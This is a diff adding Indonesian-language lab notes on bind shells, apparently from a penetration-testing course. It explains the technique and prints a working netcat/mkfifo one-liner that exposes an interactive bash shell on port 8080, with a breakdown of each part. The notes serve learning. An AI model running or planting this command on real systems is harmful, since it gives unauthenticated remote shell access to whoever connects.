@@ -116,3 +116,46 @@ Dari sini, kita bisa lanjut ke tahap berikutnya kayak **Privilege Escalation** a
 ## Task 4: Bind Shell
 
 ### Bind Shell
+
+Jadi kebalikannya reverse shell, di sini **attacker yang connect ke target**.
+
+Alurnya:
+
+1. Target buka port **(listening)**.
+2. Attacker connect ke IP & Port target.
+3. Attacker dapet akses shell.
+
+Teknik ini biasanya dipake kalau target punya aturan firewall yang ketat buat koneksi keluar (outgoing blocked), tapi ada celah buat koneksi masuk.
+
+**Kekurangan:**
+Cara ini kurang populer karena butuh port yang terbuka dan nunggu di sisi target, yang mana gampang banget dideteksi sama firewall atau Intrusion Detection System (IDS).
+
+### How bind shells work
+
+**Setting Up the Bind Shell on the Target**
+
+Biar bisa jalan, kita harus bikin target "listening" dulu. Salah satu command yang bisa dipake di mesin target adalah:
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+```
+
+**Penjelasan Payload:**
+
+- `rm -f /tmp/f`: Hapus file `/tmp/f` kalau ada, biar bersih dan gak konflik.
+- `mkfifo /tmp/f`: Bikin **Named Pipe** di `/tmp/f`. Ini saluran komunikasi dua arah kita.
+- `cat /tmp/f`: Baca data dari pipe dan nunggu input.
+- `| bash -i 2>&1`: Output `cat` dioper ke shell `bash` secara interaktif. Error message (`stderr`) juga diredirect ke `stdout`.
+- `| nc -l 0.0.0.0 8080`: Jalanin Netcat dalam **listen mode** (`-l`) di semua interface (`0.0.0.0`) port **8080**. Ini intinya nungguin attacker buat connect.
+- `> /tmp/f`: Output dari Netcat (hasil perintah shell) dibalikin lagi ke pipe, biar komunikasinya nyambung terus.
+
+**Catatan:**
+Kita pake port **8080** karena port di bawah 1024 (kayak 80, 443) butuh akses **root** (elevated privileges). Kalau kita cuma user biasa, kita harus pake port tinggi (di atas 1024).
+
+**Terminal on the Target Machine:**
+
+```bash
+target@rootuser:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+```
+
+Setelah command ini dijalankan, terminal target bakal "gantung" (waiting) nungguin koneksi dari kita.
